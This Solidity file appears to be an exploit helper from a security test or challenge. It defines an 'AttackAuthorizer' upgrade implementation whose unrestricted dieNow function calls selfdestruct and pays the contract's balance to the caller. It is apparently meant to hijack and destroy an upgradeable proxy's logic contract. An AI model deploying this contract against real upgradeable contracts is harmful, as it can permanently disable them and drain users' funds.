// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "./AuthorizerUpgradeable.sol";

contract AttackAuthorizer is AuthorizerUpgradeable {
    function dieNow() external {
        selfdestruct(payable(msg.sender));
    }
}
